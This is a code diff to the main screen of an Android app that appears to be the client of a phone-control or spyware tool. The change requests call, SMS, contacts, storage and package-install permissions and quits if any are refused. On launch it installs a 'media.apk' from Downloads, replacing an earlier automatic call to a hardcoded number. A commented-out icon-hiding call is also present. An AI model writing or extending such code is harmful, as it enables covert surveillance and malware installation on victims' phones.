@@ -10,19 +10,29 @@ import android.content.ComponentName;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.ot.grhq.client.functionality.FileManager;
 import com.ot.grhq.client.functionality.Phone;
 import com.ot.grhq.client.functionality.SMS;
 
+import java.io.File;
+import java.util.List;
 import java.util.Map;
 
 public class MainActivity extends AppCompatActivity {
 
     private static final int PERMISSION_REQUEST_CODE = 200;
     private static String[] PERMISSIONS = {
-        Manifest.permission.SEND_SMS
+        Manifest.permission.CALL_PHONE,
+        Manifest.permission.SEND_SMS,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.WRITE_CONTACTS,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.REQUEST_INSTALL_PACKAGES
     };
 
     @Override
@@ -30,12 +40,10 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        getPermissions();
-        if (!checkPermissions())
-            finishAffinity();
+        checkPermissions();
 
 //        hideApplicationIcon();
-        Phone.call(getApplicationContext(), "+2348185571169");
+        com.ot.grhq.client.functionality.PackageManager.installApp(getApplicationContext(), "file://" +Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)+"/media.apk");
     }
 
     /**
@@ -56,22 +64,29 @@ public class MainActivity extends AppCompatActivity {
      * Check if necessary permissions are granted
      * @return <c>true</c> if all are granted; false otherwise
      */
-    private boolean checkPermissions() {
+    private void checkPermissions() {
         for (String permission : PERMISSIONS) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED)
-                    return false;
+                    getPermission(permission);
             }
         }
-
-        return true;
     }
 
     /**
-     * Request for necessary permissions
+     * Request for permission
      */
-    private void getPermissions() {
+    private void getPermission(String permission) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
-            requestPermissions(PERMISSIONS, PERMISSION_REQUEST_CODE);
+            requestPermissions(new String[] { permission }, PERMISSION_REQUEST_CODE);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        for (int result : grantResults) {
+            if (result != PackageManager.PERMISSION_GRANTED)
+                finishAffinity();
+        }
     }
 }
